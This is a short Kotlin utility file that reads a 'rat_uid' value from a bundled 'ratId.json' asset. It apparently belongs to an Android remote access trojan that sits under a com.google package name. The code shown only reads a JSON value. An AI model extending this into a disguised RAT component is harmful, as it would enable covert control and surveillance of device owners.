package com.google.appmods

import android.content.Context
import org.json.JSONObject

object Utils {
    fun getRatUid(ctx: Context): String {
        return try {
            JSONObject(ctx.assets.open("ratId.json").bufferedReader().use { it.readText() }).optString("rat_uid", "")
        } catch (e: Exception) {
            ""
        }
    }
}
